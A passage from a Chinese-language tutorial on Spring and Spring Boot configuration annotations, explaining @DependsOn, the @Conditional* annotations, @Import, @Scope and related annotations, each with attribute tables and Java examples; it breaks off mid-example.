<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>指定 Bean 名称</td><td>与<code>name</code>属性等价，优先级相同，支持数组形式定义多个别名</td></tr><tr><td>name</td><td>指定 Bean 名称</td><td>推荐使用，语义更清晰，如<code>name = "userService"</code></td></tr><tr><td>autowireCandidate</td><td>是否作为自动装配候选 Bean</td><td>① <code>true</code>（默认）：允许被<code>@Autowired</code>自动装配；② <code>false</code>：排除自动装配，仅能通过<code>BeanFactory</code>手动获取</td></tr><tr><td>initMethod</td><td>初始化方法名</td><td>方法需无参、无返回值，Bean 初始化完成后执行，替代<code>InitializingBean</code>接口</td></tr><tr><td>destroyMethod</td><td>销毁方法名</td><td>方法需无参、无返回值，容器关闭时执行（仅单例 Bean 生效），替代<code>DisposableBean</code>接口，默认会检测<code>close()</code>/<code>shutdown()</code>方法</td></tr></tbody></table>
<h3 data-id="heading-3">3. @DependsOn</h3>
<p><code>@DependsOn</code> 用于声明 Bean 之间的<strong>依赖顺序</strong>，确保指定 Bean 在当前 Bean 之前创建。</p>
<ul>
<li>非强依赖：区别于字段注入 / 构造器注入的 “依赖注入”，仅保证创建顺序，不涉及属性赋值；</li>
<li>适用场景：如数据源 Bean 需在数据访问 Bean 之前初始化，或启动时需先加载配置 Bean。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>依赖的 Bean 名称数组</td><td>如<code>value = {"dataSource", "redisTemplate"}</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependsOnConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
   }
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@DependsOn("dataSource")</span> <span class="hljs-comment">// 确保 dataSource 先创建</span>
   <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource());
   }
}
</code></pre>
<h3 data-id="heading-4">4. @ComponentScan</h3>
<p><code>@ComponentScan</code> 用于指定 Spring 扫描 Bean 的包路径，自动注册标注了<code>@Component</code>/<code>@Service</code>/<code>@Repository</code>/<code>@Controller</code>的类。</p>
<ul>
<li>核心逻辑：通过过滤器（Filter）筛选需要纳入容器的类，支持包含 / 排除规则；</li>
<li>默认行为：未指定包路径时，扫描当前注解所在类的包及其子包。</li>
</ul>
<p><strong>属性说明：</strong></p>























































<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>扫描的基础包路径</td><td>与<code>basePackages</code>等价，如<code>value = "com.example.service"</code></td></tr><tr><td>nameGenerator</td><td>Bean 名称生成器</td><td>自定义 Bean 名称规则，需实现<code>BeanNameGenerator</code>接口</td></tr><tr><td>scopeResolver</td><td>Bean 作用域解析器</td><td>自定义作用域解析逻辑，需实现<code>ScopeMetadataResolver</code>接口</td></tr><tr><td>basePackages</td><td>指定扫描的基础包</td><td>支持数组形式，如<code>basePackages = {"com.example.service", "com.example.dao"}</code></td></tr><tr><td>basePackageClasses</td><td>指定扫描的基准类</td><td>扫描指定类所在的包，如<code>basePackageClasses = UserService.class</code></td></tr><tr><td>useDefaultFilters</td><td>是否启用默认过滤器</td><td>① <code>true</code>（默认）：扫描<code>@Component</code>及其衍生注解；② <code>false</code>：仅扫描自定义过滤器匹配的类</td></tr><tr><td>includeFilters</td><td>包含过滤器</td><td>仅匹配规则的类被扫描，如指定扫描标注<code>@MyAnnotation</code>的类</td></tr><tr><td>excludeFilters</td><td>排除过滤器</td><td>匹配规则的类不被扫描，如排除<code>@Controller</code>标注的类</td></tr><tr><td>lazyInit</td><td>是否懒加载扫描到的 Bean</td><td>① <code>true</code>：所有扫描的 Bean 均懒加载；② <code>false</code>（默认）：单例 Bean 立即加载</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 扫描指定包，排除 Controller，仅包含 Service</span>
<span class="hljs-meta">@ComponentScan(
   basePackages = "com.example",
   excludeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION, value = Controller.class),
   includeFilters = @ComponentScan.Filter(type = FilterType.ANNOTATION, value = Service.class)
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScanConfig</span> {
}
</code></pre>
<h3 data-id="heading-5">5. @ConditionalOnBean</h3>
<p><code>@ConditionalOnBean</code> 是 Spring Boot 条件注解，仅当容器中存在指定 Bean 时，才加载当前 Bean。</p>
<ul>
<li>适用场景：按需加载 Bean，如仅当 RedisTemplate 存在时，才创建 Redis 缓存管理器。</li>
</ul>
<p><strong>属性说明：</strong></p>








































<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>指定 Bean 的 Class 类型</td><td>如<code>value = RedisTemplate.class</code></td></tr><tr><td>type</td><td>指定 Bean 的类型名称</td><td>字符串形式，避免类依赖，如<code>type = "org.springframework.data.redis.core.RedisTemplate"</code></td></tr><tr><td>annotation</td><td>指定 Bean 需包含的注解</td><td>如<code>annotation = Repository.class</code>（仅扫描标注 @Repository 的 Bean）</td></tr><tr><td>name</td><td>指定 Bean 的名称</td><td>如<code>name = "redisTemplate"</code></td></tr><tr><td>search</td><td>是否搜索父容器 / 祖先容器</td><td>枚举值：<code>SearchStrategy.CURRENT</code>（仅当前容器，默认）、<code>SearchStrategy.PARENTS</code>（父容器）、<code>SearchStrategy.ALL</code>（所有祖先容器）</td></tr><tr><td>parameterizedContainer</td><td>指定参数化类型容器</td><td>匹配泛型容器中的 Bean，如<code>parameterizedContainer = List.class</code>（匹配 List 类型的 Bean）</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionalBeanConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
   }
   <span class="hljs-comment">// 仅当 redisTemplate 存在时，创建 RedisCacheManager</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@ConditionalOnBean(name = "redisTemplate")</span>
   <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> RedisCacheManager.builder(redisTemplate()).build();
   }
}
</code></pre>
<h3 data-id="heading-6">6. @ConditionalOnMissingBean</h3>
<p><code>@ConditionalOnMissingBean</code> 与<code>@ConditionalOnBean</code>相反，仅当容器中<strong>不存在</strong>指定 Bean 时，才加载当前 Bean。</p>
<ul>
<li>核心用途：实现 “默认 Bean” 逻辑，如自定义 Bean 不存在时，加载框架默认实现。</li>
</ul>
<p><strong>属性说明：</strong></p>



















<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>ignored</td><td>忽略匹配的 Class</td><td>排除指定类型的 Bean，如<code>ignored = CustomRedisTemplate.class</code></td></tr><tr><td>ignoredType</td><td>忽略匹配的类型名称</td><td>字符串形式，如<code>ignoredType = "com.example.CustomRedisTemplate"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultBeanConfig</span> {
   <span class="hljs-comment">// 仅当容器中无 UserService 时，加载默认实现</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@ConditionalOnMissingBean(type = "com.example.service.UserService")</span>
   <span class="hljs-keyword">public</span> UserService <span class="hljs-title function_">defaultUserService</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultUserService</span>();
   }
}
</code></pre>
<h3 data-id="heading-7">7. @ConditionalOnClass</h3>
<p><code>@ConditionalOnClass</code> 仅当类路径中存在指定 Class 时，才加载当前 Bean。</p>
<ul>
<li>适用场景：适配不同依赖环境，如仅当引入 MyBatis 依赖时，加载 MyBatis 配置 Bean。</li>
</ul>
<p><strong>属性说明：</strong></p>




















<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>指定 Class 类型</td><td>如<code>value = SqlSessionFactory.class</code></td></tr><tr><td>name</td><td>指定 Class 全限定名</td><td>避免编译期依赖，如<code>name = "org.apache.ibatis.session.SqlSessionFactory"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 仅当类路径存在 SqlSessionFactory 时，加载 MyBatis 配置</span>
<span class="hljs-meta">@ConditionalOnClass(SqlSessionFactory.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> SqlSessionFactory <span class="hljs-title function_">sqlSessionFactory</span><span class="hljs-params">(DataSource dataSource)</span> <span class="hljs-keyword">throws</span> Exception {
       <span class="hljs-type">SqlSessionFactoryBean</span> <span class="hljs-variable">factoryBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBean</span>();
       factoryBean.setDataSource(dataSource);
       <span class="hljs-keyword">return</span> factoryBean.getObject();
   }
}
</code></pre>
<h3 data-id="heading-8">8. @ConditionalOnMissingClass</h3>
<p><code>@ConditionalOnMissingClass</code> 仅当类路径中<strong>不存在</strong>指定 Class 时，才加载当前 Bean。</p>
<ul>
<li>适用场景：降级处理，如未引入某个依赖时，加载兜底实现。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>指定 Class 全限定名数组</td><td>如<code>value = "org.springframework.data.redis.core.RedisTemplate"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 未引入 Redis 时，加载本地缓存</span>
<span class="hljs-meta">@ConditionalOnMissingClass("org.springframework.data.redis.core.RedisTemplate")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCacheConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> CacheManager <span class="hljs-title function_">localCacheManager</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentMapCacheManager</span>();
   }
}
</code></pre>
<h3 data-id="heading-9">9. @ConditionalOnProperty</h3>
<p><code>@ConditionalOnProperty</code> 仅当配置文件中存在指定属性（且值匹配）时，才加载当前 Bean。</p>
<ul>
<li>核心用途：通过配置开关控制 Bean 加载，实现环境适配。</li>
</ul>
<p><strong>属性说明：</strong></p>



































<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>属性名数组</td><td>与<code>name</code>等价，如<code>value = "spring.cache.enabled"</code></td></tr><tr><td>prefix</td><td>属性名前缀</td><td>简化属性名书写，如<code>prefix = "spring.cache"</code> + <code>name = "enabled"</code> 等价于<code>spring.cache.enabled</code></td></tr><tr><td>name</td><td>属性名</td><td>支持数组，如<code>name = {"enabled", "type"}</code></td></tr><tr><td>havingValue</td><td>指定属性值</td><td>匹配属性的具体值，如<code>havingValue = "redis"</code></td></tr><tr><td>matchIfMissing</td><td>属性不存在时是否匹配</td><td>① <code>true</code>：属性不存在时仍加载 Bean；② <code>false</code>（默认）：属性不存在则不加载</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 当 spring.cache.enabled=true 且 type=redis 时，加载 Redis 缓存</span>
<span class="hljs-meta">@ConditionalOnProperty(
   prefix = "spring.cache",
   name = {"enabled", "type"},
   havingValue = "redis",
   matchIfMissing = false
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisCacheConfig</span> {
   <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-10">10. @ConditionalOnResource</h3>
<p><code>@ConditionalOnResource</code> 仅当类路径中存在指定资源文件时，才加载当前 Bean。</p>
<ul>
<li>适用场景：加载自定义配置文件，如仅当存在<code>app-custom.properties</code>时，加载对应配置。</li>
</ul>
<p><strong>属性说明：</strong></p>















<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>资源路径数组</td><td>支持 classpath 路径，如<code>value = "classpath:app-custom.properties"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 仅当存在自定义配置文件时，加载配置</span>
<span class="hljs-meta">@ConditionalOnResource(resources = "classpath:app-custom.properties")</span>
<span class="hljs-meta">@PropertySource("classpath:app-custom.properties")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomConfig</span> {
   <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-11">11. @ConditionalOnSingleCandidate</h3>
<p><code>@ConditionalOnSingleCandidate</code> 仅当容器中指定类型的 Bean<strong>仅有一个候选 Bean</strong>（或有 @Primary 标记的 Bean）时，才加载当前 Bean。</p>
<ul>
<li>适用场景：避免多 Bean 冲突，如仅当数据源 Bean 唯一时，加载 JdbcTemplate。</li>
</ul>
<p><strong>属性说明：</strong></p>
























<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>Bean 的 Class 类型</td><td>如<code>value = DataSource.class</code></td></tr><tr><td>type</td><td>Bean 的 Class 全限定名</td><td>如<code>type = "javax.sql.DataSource"</code></td></tr><tr><td>search</td><td>是否搜索父容器</td><td>同<code>@ConditionalOnBean</code>的 search 属性</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-comment">// 仅当数据源 Bean 唯一时，创建 JdbcTemplate</span>
<span class="hljs-meta">@ConditionalOnSingleCandidate(DataSource.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> JdbcTemplate <span class="hljs-title function_">jdbcTemplate</span><span class="hljs-params">(DataSource dataSource)</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);
   }
}
</code></pre>
<h3 data-id="heading-12">12. @Import</h3>
<p><code>@Import</code> 用于手动导入 Bean 到容器，支持三种导入方式，是扩展 Spring 容器的核心注解。</p>
<ul>
<li>核心优势：无需扫描，直接显式注册 Bean，灵活控制 Bean 加载逻辑。</li>
</ul>
<p><strong>属性说明：</strong></p>















<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>导入的 Class 数组</td><td>支持三种类型：① 普通配置类（@Configuration 标注）；② ImportSelector 实现类（返回 Class 全限定名，批量导入）；③ ImportBeanDefinitionRegistrar 实现类（手动注册 BeanDefinition）</td></tr></tbody></table>
<p><strong>示例 1：导入普通配置类</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Import(MyBatisConfig.class)</span> <span class="hljs-comment">// 导入 MyBatis 配置类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppMainConfig</span> {
}
</code></pre>
<p><strong>示例 2：ImportSelector 实现类</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 自定义 ImportSelector</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImportSelector</span> {
   <span class="hljs-meta">@Override</span>
   <span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) {
       <span class="hljs-comment">// 批量导入两个 Bean</span>
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">"com.example.service.UserService"</span>, <span class="hljs-string">"com.example.dao.UserDao"</span>};
   }
}
<span class="hljs-comment">// 导入 Selector</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Import(MyImportSelector.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectorConfig</span> {
}
</code></pre>
<h3 data-id="heading-13">13. @ImportResource</h3>
<p><code>@ImportResource</code> 用于导入传统 XML 配置文件中的 Bean，实现注解与 XML 配置的兼容。</p>
<ul>
<li>适用场景：迁移老项目时，保留 XML 配置，逐步过渡到注解配置。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>XML 文件路径数组</td><td>与<code>locations</code>等价，如<code>value = "classpath:spring-dao.xml"</code></td></tr><tr><td>locations</td><td>XML 文件路径数组</td><td>支持多个文件，如<code>locations = {"classpath:spring-service.xml", "classpath:spring-dao.xml"}</code></td></tr><tr><td>reader</td><td>自定义 BeanDefinition 读取器</td><td>需实现<code>BeanDefinitionReader</code>接口，自定义 XML 解析逻辑</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ImportResource(locations = "classpath:spring-legacy.xml")</span> <span class="hljs-comment">// 导入 XML 配置</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LegacyConfig</span> {
}
</code></pre>
<h3 data-id="heading-14">14. @Lazy</h3>
<p><code>@Lazy</code> 用于标记 Bean 为懒加载，即仅当首次获取 Bean 时才初始化，
而非容器启动时。</p>
<ul>
<li>仅对单例 Bean 生效（原型 Bean 默认懒加载）；</li>
<li>可标注在<code>@Configuration</code>类上，批量设置该类中<code>@Bean</code>的懒加载。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>是否懒加载</td><td>① <code>true</code>（默认）：懒加载；② <code>false</code>：立即加载</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyConfig</span> {
   <span class="hljs-comment">// 懒加载Bean，首次调用时初始化</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@Lazy(true)</span>
   <span class="hljs-keyword">public</span> HeavyService <span class="hljs-title function_">heavyService</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyService</span>(); <span class="hljs-comment">// 初始化耗时较长的Bean</span>
   }
}
</code></pre>
<h3 data-id="heading-15">15. @Primary</h3>
<p><code>@Primary</code> 标记 Bean 为 “主 Bean”，当存在多个同类型 Bean 时，<code>@Autowired</code>优先注入该 Bean。</p>
<ul>
<li>适用场景：解决多 Bean 自动装配冲突，如默认数据源、默认缓存管理器。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimaryConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@Primary</span> <span class="hljs-comment">// 主数据源，@Autowired优先注入</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">primaryDataSource</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
   }
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">secondaryDataSource</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HikariDataSource</span>();
   }
}
<span class="hljs-comment">// 使用时，自动注入primaryDataSource</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
   <span class="hljs-meta">@Autowired</span>
   <span class="hljs-keyword">private</span> DataSource dataSource; <span class="hljs-comment">// 注入primaryDataSource</span>
}
</code></pre>
<h3 data-id="heading-16">16. @Profile</h3>
<p><code>@Profile</code> 用于按环境加载 Bean，仅当指定环境激活时，才加载标注的 Bean。</p>
<ul>
<li>常用环境：<code>dev</code>（开发）、<code>test</code>（测试）、<code>prod</code>（生产）；</li>
<li>激活方式：通过<code>spring.profiles.active</code>配置（如<code>application.yml</code>中设置）。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>环境名称数组</td><td>如<code>value = {"dev", "test"}</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProfileConfig</span> {
   <span class="hljs-comment">// 开发环境数据源</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@Profile("dev")</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">devDataSource</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmbeddedDatabaseBuilder</span>().setType(EmbeddedDatabaseType.H2).build();
   }
   <span class="hljs-comment">// 生产环境数据源</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@Profile("prod")</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">prodDataSource</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
   }
}
</code></pre>
<h3 data-id="heading-17">17. @PropertySource</h3>
<p><code>@PropertySource</code> 用于加载自定义配置文件，将配置项纳入 Spring 的 Environment 管理。</p>
<ul>
<li>核心特性：支持多种编码、忽略不存在的文件，配合<code>@Value</code>或<code>@ConfigurationProperties</code>使用。</li>
</ul>
<p><strong>属性说明：</strong></p>



































<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>name</td><td>PropertySource 名称</td><td>自定义名称，如<code>name = "customProperties"</code></td></tr><tr><td>value</td><td>配置文件路径</td><td>如<code>value = "classpath:app-custom.properties"</code></td></tr><tr><td>ignoreResourceNotFound</td><td>是否忽略不存在的文件</td><td>① <code>true</code>：忽略；② <code>false</code>（默认）：文件不存在则抛异常</td></tr><tr><td>encoding</td><td>配置文件编码</td><td>如<code>encoding = "UTF-8"</code></td></tr><tr><td>factory</td><td>自定义配置文件读取工厂</td><td>需实现<code>PropertySourceFactory</code>，支持 YAML 等非 properties 文件</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@PropertySource(
   value = "classpath:app-custom.properties",
   encoding = "UTF-8",
   ignoreResourceNotFound = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertyConfig</span> {
   <span class="hljs-meta">@Value("${app.name}")</span>
   <span class="hljs-keyword">private</span> String appName; <span class="hljs-comment">// 读取app-custom.properties中的app.name</span>
}
</code></pre>
<h3 data-id="heading-18">18. @Role</h3>
<p><code>@Role</code> 定义 Bean 的角色，用于区分 Bean 的用途（框架内部 / 应用层）。</p>
<ul>
<li><code>BeanDefinition.ROLE_APPLICATION</code>（默认）：应用层 Bean，开发者关注；</li>
<li><code>BeanDefinition.ROLE_INFRASTRUCTURE</code>：框架内部 Bean，对开发者透明；</li>
<li><code>BeanDefinition.ROLE_SUPPORT</code>：支撑性 Bean，辅助应用层 Bean 运行。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>角色值</td><td>对应上述三个常量，如<code>value = BeanDefinition.ROLE_INFRASTRUCTURE</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Role(BeanDefinition.ROLE_INFRASTRUCTURE)</span> <span class="hljs-comment">// 标记为框架内部配置类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrameworkConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> TransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>();
   }
}
</code></pre>
<h3 data-id="heading-19">19. @Scope</h3>
<p><code>@Scope</code> 定义 Bean 的作用域，决定 Bean 的生命周期范围。</p>
<ul>
<li><code>SCOPE_SINGLETON</code>（默认）：单例，容器中仅一个实例；</li>
<li><code>SCOPE_PROTOTYPE</code>：原型，每次获取创建新实例；</li>
<li><code>SCOPE_REQUEST</code>：请求作用域，每个 HTTP 请求一个实例；</li>
<li><code>SCOPE_SESSION</code>：会话作用域，每个 HTTP 会话一个实例。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>作用域名称</td><td>与<code>scopeName</code>等价，如<code>value = ScopeConstants.SCOPE_REQUEST</code></td></tr><tr><td>scopeName</td><td>作用域名称</td><td>语义更清晰，推荐使用</td></tr><tr><td>proxyMode</td><td>代理模式</td><td>解决作用域依赖问题（如单例 Bean 依赖请求作用域 Bean），可选：① <code>ScopedProxyMode.NO</code>（默认）：无代理；② <code>ScopedProxyMode.INTERFACES</code>：JDK 动态代理；③ <code>ScopedProxyMode.TARGET_CLASS</code>：CGLIB 代理</td></tr></tbody></table>
<p><strong>作用域依赖问题：</strong> 单例bean依赖请求作用域bean，但是请求作用域bean，只有在请求时才会产生，而单例bean在启动时会进行依赖注入。如果不代理则无法注入请求作用域bean</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScopeConfig</span> {
   <span class="hljs-comment">// 请求作用域Bean，通过CGLIB代理解决依赖问题</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-meta">@Scope(value = ScopeConstants.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)</span>
   <span class="hljs-keyword">public</span> RequestContext <span class="hljs-title function_">requestContext</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestContext</span>();
   }
   <span class="hljs-comment">// 单例Bean依赖请求作用域Bean（通过代理注入）</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> UserService <span class="hljs-title function_">userService</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>(requestContext());
   }
}
</code></pre>
<h3 data-id="heading-20">20. @AutoConfigureAfter / @AutoConfigureBefore / @AutoConfigureOrder</h3>
<p>这三个注解用于控制<code>@Configuration</code>配置类的加载顺序，类似<code>@DependsOn</code>但针对配置类解析阶段。</p>
<ul>
<li>核心区别：<code>@DependsOn</code>控制 Bean 创建顺序，这三个注解控制配置类解析顺序。</li>
</ul>
<p><strong>属性说明：</strong></p>



















<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>name</td><td>配置类全限定名数组</td><td>如<code>name = "com.example.MyBatisConfig"</code></td></tr><tr><td>value</td><td>配置类 Class 数组</td><td>如<code>value = MyBatisConfig.class</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 数据源配置先解析</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
